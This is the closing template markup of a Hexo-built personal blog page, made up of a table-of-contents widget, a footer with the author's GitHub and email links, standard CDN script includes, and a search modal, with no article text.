        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
            <i class="fas fa-list"></i>
        </button>
        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
            <div class="toc-widget">
                <div id="toc-content" class="text-truncate">
                </div>
            </div>
            <div class="toc-menu pt-3 pl-4">
                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
                <a class="back-to-top d-block py-1" href="#">Back to top</a>
                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
            </div>
        </div>
    </div>
    <script>
        tocbot.init({
            // Where to render the table of contents.
            tocSelector: '#toc-content',
            // Where to grab the headings to build the table of contents.
            contentSelector: 'article',
            // Which headings to grab inside of the contentSelector element.
            headingSelector: 'h1, h2, h3',
            // For headings inside relative or absolute positioned containers within content.
            hasInnerContainers: true,
        });
    </script>


    


    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer id="footer">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
                <ul class="list-inline">
                    

                    

                    
                        <li class="list-inline-item">
                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    
                        <li class="list-inline-item">
                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    
                </ul>
                <ul class="copyright footer-menu list-inline">
                    
                    
                        <li class="list-inline-item">
                            
                            
                            <a href="/">
                                
                                    Home
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/archives">
                                
                                    Archives
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/tags">
                                
                                    Tags
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/categories">
                                
                                    Categories
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/about">
                                
                                    About
                                
                            </a>
                        </li>
                    
                </ul>
                <p class="copyright footer-author">
                    &copy; -2025 
                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
                    
                    
                </p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    <!-- jQuery -->
<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>

<!-- For drop down -->
<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>

<!-- Bootstrap -->
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
<!-- Gallery -->
<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
<!-- Busuanzi -->


<!-- Search script -->

<script src="/js/search.js"></script>

<script type="text/javascript">
    $(function () {
        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
    });
</script>



<script src="/js/main.js"></script>



    <!-- Search Modal -->
    <!-- Modal -->
<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
        <div class="modal-content overflow-auto">
            <div class="modal-header">
                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <div id="searchResult">
                    <div class="search-empty text-center text-muted p-5">
                        <i class="far fa-meh"></i>
                    </div>
                </div>
            </div> 
        </div>
    </div>
</div>


</body>
</html>